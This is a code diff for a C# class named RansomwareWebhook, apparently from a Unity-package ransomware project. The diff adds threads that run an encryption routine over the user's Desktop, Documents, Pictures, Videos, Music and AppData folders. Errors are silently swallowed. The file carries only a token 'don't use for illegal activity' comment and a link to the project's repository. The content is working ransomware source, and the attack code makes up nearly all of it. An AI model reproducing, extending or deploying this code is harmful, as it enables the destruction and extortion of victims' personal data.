@@ -5,22 +5,19 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.DirectoryServices;
+using System.Threading;
 
 namespace UnitypackageRussianRoulett
 {
- 
+    //Dont use that for Illegal aktivity!
+    //Github: https://github.com/none-development/unitypackage-ransomware
     public static class RansomwareWebhook
     {
-        void RansomwareWebhook(){
-            Startencrypt(true);
-        }
-
         private static string RandomString(int length, bool chinese) //Generate a Unice Password for the File
         {
             Random rand = new Random();
             const string pool = "abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
             const string poolchinese = "ㄓㄨㄥㄨㄣ中文字将制造款世界上最先进的飞机这是份非常简单的说明书";
-            const string poolascii = "꧂꧁〄➤♑︎┊♡🎔✺⚫╄";
             var builder = new StringBuilder();
 
             for (var i = 0; i < length; i++)
@@ -70,31 +67,105 @@ namespace UnitypackageRussianRoulett
         }
 
 
-        private static string MY_COMPUTER = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
+        private static string _APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
-        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
         private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
         private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
         private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
 
 
-        //This Methode use Folder Path to Encrypt the Files. Without admin you can only encrypt *.txt, *.{media}
-        //This bool is for Safty. Dont use that to encrypt other PCs
+         /// <summary>
+         /// Start the Ransomware
+         /// </summary>
+         /// <param name="a">Set it to True too Encrypt the System</param>
 
         public static void Startencrypt(bool a)
         {
             if (a)
             {
-                encryptStuff(DESKTOP_FOLDER);
-                encryptStuff(DOCUMENTS_FOLDER);
-                encryptStuff(PICTURES_FOLDER);
-                encryptStuff(MUSIC_FOLDER);
-                encryptStuff(VIDEOS_FOLDER);
-                encryptStuff(MY_COMPUTER);
+                StartHandler();
             }
         }
+        /// <summary>
+        /// Thread Handler to make it Faster
+        /// </summary>
 
-      
+        public static void StartHandler()
+        {
+            Thread BASE_1 = new Thread(DESKTOP);
+            Thread BASE_2 = new Thread(DOCUMENTS);
+            Thread BASE_3 = new Thread(PICTURES);
+            Thread BASE_4 = new Thread(VIDEOS);
+            Thread BASE_5 = new Thread(MUSIK);
+            Thread BASE_6 = new Thread(APPDATA);
+
+            BASE_1.Start();
+            BASE_2.Start();
+            BASE_3.Start();
+            BASE_4.Start();
+            BASE_5.Start();
+            BASE_6.Start();
+
+        }
+
+        //Everything on the DESKTOP
+        private static void DESKTOP() {
+            encryptStuff(DESKTOP_FOLDER);
+        }
+
+        //Somtiome it work
+        private static void DOCUMENTS()
+        {
+            try
+            {
+                encryptStuff(DOCUMENTS_FOLDER);
+            } catch { }
+        }
+
+        //Somtiome it work
+        private static void PICTURES()
+        {
+            try
+            {
+                encryptStuff(PICTURES_FOLDER);
+            }
+            catch { }
+        }
+        //Somtiome it work
+        private static void VIDEOS()
+        {
+            try
+            {
+                encryptStuff(VIDEOS_FOLDER);
+            }
+            catch { }
+        }
+        //Somtiome it work
+        private static void MUSIK()
+        {
+            try
+            {
+                encryptStuff(MUSIC_FOLDER);
+            }
+            catch { }
+        }
+
+        private static void APPDATA()
+        {
+            try
+            {
+                encryptStuff(_APPDATA);
+            }
+            catch { }
+        }
+
+
+
+
+
+        // Cryto Stuff
+
         private static void encryptStuff(string sDir)
         {
             try
@@ -149,7 +220,7 @@ namespace UnitypackageRussianRoulett
 
                 fsIn.Close();
             }
-            catch (Exception ex)
+            catch
             {
 
             }
@@ -181,4 +252,5 @@ namespace UnitypackageRussianRoulett
 
        
     }
+
 }
